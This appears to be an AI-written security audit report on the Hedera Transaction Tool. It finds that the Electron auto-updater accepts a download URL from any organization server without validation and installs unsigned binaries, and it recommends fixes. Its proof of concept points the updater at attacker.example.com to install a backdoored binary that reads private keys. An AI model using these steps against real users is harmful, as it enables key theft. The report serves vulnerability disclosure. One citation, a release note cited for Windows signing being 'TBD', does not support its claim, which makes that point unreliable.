All key claims are now verified against the actual code. Let me compile the final audit report.

Audit Report

## Title
Unsigned Electron Binaries and Organization-Server-Controlled Auto-Update URL Enable Malicious Binary Installation

## Summary
The Hedera Transaction Tool distributes Electron desktop binaries with code signing explicitly disabled and no Windows certificate configured. The auto-updater's feed URL is sourced directly from the connected organization server's version-check API response with no URL validation or independent binary signature verification. A malicious or compromised organization server can direct the app to download and silently install a backdoored binary, compromising all Hedera private keys managed by the application.

## Finding Description

**Root Cause 1 — Unsigned distributed binaries:**

`notarize: false` is explicitly set for macOS builds: [1](#0-0) 

Windows code signing is unimplemented, marked "TBD": [2](#0-1) 

**Root Cause 2 — Auto-updater feed URL sourced from organization server with no validation:**

The `checkVersion` response from the organization server is stored directly into `organizationUpdateUrls` without any URL validation or allowlisting: [3](#0-2) 

`setVersionDataForOrg` stores `data.updateUrl` verbatim from the server response: [4](#0-3) 

The global `updateUrl` is derived directly from `organizationUpdateUrls`, which is populated from the org server: [5](#0-4) 

`MandatoryUpgrade.vue` passes this URL directly to `startUpdate()`: [6](#0-5) 

The IPC handler passes the URL directly to `checkForUpdatesAndDownload`: [7](#0-6) 

`ElectronUpdaterService.initialize()` sets the feed URL with `provider: 'generic'`, which fetches `latest.yml` from the attacker-controlled URL and verifies only the SHA512 hash declared in that same `latest.yml`. Since the attacker controls both the binary and the `latest.yml`, this hash check provides no security guarantee: [8](#0-7) 

The `IVersionCheckResponse` interface confirms `updateUrl` is a server-supplied field with no constraints: [9](#0-8) 

On the server side, `getUpdateUrl()` in `FrontendVersionGuard` constructs the URL from `FRONTEND_REPO_URL` config — but a malicious org server operator controls their own config and can return any URL: [10](#0-9) 

## Impact Explanation

The Electron app manages Hedera private keys stored in a local SQLite database. Private keys are encrypted with AES-256-GCM using a key derived via PBKDF2/argon2: [11](#0-10) 

A backdoored binary has full filesystem access to this database and can exfiltrate keys or mnemonics, leading to complete compromise of all Hedera accounts managed by the tool.

## Likelihood Explanation

The attacker only needs to operate a reachable organization server — this is an explicitly supported workflow (any user can add an organization server via the UI). No privileged access to the victim's machine or the legitimate GitHub account is required. The update flow is triggered automatically when the server reports a newer version. The absence of code signing means the OS provides no warning that the binary is from an unknown publisher.

## Recommendation

1. **Validate and allowlist `updateUrl`**: The client should reject any `updateUrl` that does not match a hardcoded allowlist (e.g., `https://github.com/hashgraph/hedera-transaction-tool/releases/`). This prevents a malicious org server from redirecting the updater to an attacker-controlled host.
2. **Enable code signing**: Enable macOS notarization (`notarize: true`) and implement Windows code signing. `electron-updater` will then verify the OS-level signature on downloaded binaries, providing an independent trust anchor.
3. **Use `provider: github`** for the auto-updater instead of `provider: generic`. The GitHub provider enforces that updates come from the configured GitHub repository and verifies signatures accordingly.
4. **Pin the update source**: Do not allow the update feed URL to be overridden at runtime by any external server response.

## Proof of Concept

1. Operator sets up an organization server with `FRONTEND_REPO_URL=https://attacker.example.com/releases` and `LATEST_SUPPORTED_FRONTEND_VERSION=99.0.0`.
2. Victim adds this organization server in the app UI.
3. The app calls `checkVersion(serverUrl, FRONTEND_VERSION)`, receives `updateUrl: "https://attacker.example.com/releases/download/v99.0.0/"`.
4. `setVersionDataForOrg` stores this URL in `organizationUpdateUrls` without validation.
5. The `MandatoryUpgrade` modal appears (version `99.0.0` > current). User clicks "Install Update".
6. `startUpdate("https://attacker.example.com/releases/download/v99.0.0/")` is called, which invokes `ElectronUpdaterService.initialize()` with `provider: 'generic'` pointed at the attacker's server.
7. The attacker's server serves a crafted `latest.yml` with `version: 99.0.0` and a SHA512 matching a backdoored binary.
8. `electron-updater` downloads and installs the backdoored binary (SHA512 matches, no code signature check).
9. On next launch, the malicious binary runs with full access to the local SQLite database containing encrypted Hedera private keys.

### Citations

**File:** front-end/electron-builder.yml (L35-36)
```yaml
mac:
  notarize: false
```

**File:** front-end/RELEASE.md (L3-3)
```markdown
1. Create Draft release with the proper tag (version in `package.json` needs to match) and prefix `v`
```

**File:** front-end/src/renderer/composables/useVersionCheck.ts (L48-54)
```typescript
      const response = await checkVersion(serverUrl, FRONTEND_VERSION);

      setVersionDataForOrg(serverUrl, {
        latestSupportedVersion: response.latestSupportedVersion,
        minimumSupportedVersion: response.minimumSupportedVersion,
        updateUrl: response.updateUrl,
      });
```

**File:** front-end/src/renderer/stores/versionState.ts (L44-51)
```typescript
// Global computed updateUrl based on org statuses
export const updateUrl = computed<string | null>(() => {
  const orgsNeedingUpdate = getOrgsNeedingUpdateOrdered();
  if (!orgsNeedingUpdate.length) return null;

  const selectedOrgUrl = orgsNeedingUpdate[0].serverUrl;
  return organizationUpdateUrls.value[selectedOrgUrl] ?? null;
});
```

**File:** front-end/src/renderer/stores/versionState.ts (L83-88)
```typescript
export const setVersionDataForOrg = (serverUrl: string, data: IVersionCheckResponse): void => {
  organizationVersionData.value[serverUrl] = data;
  organizationLatestVersions.value[serverUrl] = data.latestSupportedVersion;
  organizationMinimumVersions.value[serverUrl] = data.minimumSupportedVersion;
  organizationUpdateUrls.value[serverUrl] = data.updateUrl;
  organizationUpdateTimestamps.value[serverUrl] = new Date();
```

**File:** front-end/src/renderer/components/GlobalAppProcesses/components/MandatoryUpgrade.vue (L103-107)
```vue
const handleDownload = () => {
  const urlToUse = orgUpdateUrl.value;
  if (urlToUse) {
    startUpdate(urlToUse);
  }
```

**File:** front-end/src/main/modules/ipcHandlers/update.ts (L15-19)
```typescript
  ipcMain.on(createChannelName('start-download'), (_e, updateUrl: string) => {
    const updaterService = getUpdaterService();
    if (updaterService) {
      updaterService.checkForUpdatesAndDownload(updateUrl);
    }
```

**File:** front-end/src/main/services/electronUpdater.ts (L38-45)
```typescript
    this.currentUpdateUrl = updateUrl;
    this.updater = autoUpdater;
    this.updater.setFeedURL({
      provider: 'generic',
      url: updateUrl,
    });

    this.logger.info(`Updater initialized with URL: ${updateUrl}`);
```

**File:** front-end/src/shared/interfaces/organization/version-check/index.ts (L1-4)
```typescript
export interface IVersionCheckResponse {
  latestSupportedVersion: string;
  minimumSupportedVersion: string;
  updateUrl: string | null;
```

**File:** back-end/apps/api/src/guards/frontend-version.guard.ts (L18-34)
```typescript
  private getUpdateUrl(): string | null {
    const repoUrl = this.configService.get<string>('FRONTEND_REPO_URL');
    const latestVersion = this.configService.get<string>('LATEST_SUPPORTED_FRONTEND_VERSION');

    if (!repoUrl || !latestVersion) {
      return null;
    }

    const cleanLatest = semver.clean(latestVersion);
    if (!cleanLatest) {
      return null;
    }

    const baseUrl = repoUrl.replace(/\/+$/, '');

    return `${baseUrl}/download/v${cleanLatest}/`;
  }
```

**File:** front-end/src/main/utils/crypto.ts (L12-25)
```typescript
export function encrypt(data: string, password: string) {
  const iv = crypto.randomBytes(16);
  const salt = crypto.randomBytes(64);

  const key = deriveKey(password, salt);

  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

  const encrypted = Buffer.concat([cipher.update(data, 'utf8'), cipher.final()]);

  const tag = cipher.getAuthTag();

  return Buffer.concat([salt, iv, tag, encrypted]).toString('base64');
}
```
